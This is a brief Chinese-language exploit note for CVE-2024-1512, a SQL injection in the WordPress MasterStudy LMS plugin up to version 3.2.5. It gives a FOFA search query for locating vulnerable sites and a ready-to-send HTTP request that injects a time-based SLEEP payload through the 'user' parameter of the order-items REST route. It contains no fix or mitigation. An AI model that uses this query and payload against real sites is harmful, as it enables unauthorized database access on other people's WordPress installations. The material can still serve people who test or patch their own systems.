## WordPress-MasterStudy-LMS插件存在SQL注入漏洞(CVE-2024-1512)

WordPress Plugin MasterStudy LMS 3.2.5 版本及之前版本存在安全漏洞，该漏洞源于对用户提供的参数转义不足，导致可以通过 /lms/stm-lms/order/items REST 路由的 user 参数进行基于联合的 SQL 注入。

## fofa

```
body="wp-content/plugins/masterstudy-lms-learning-management-system/"
```

## poc

```
GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%285%29%29%29sauT%29+AND+%283071%3D3071 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262219886.png)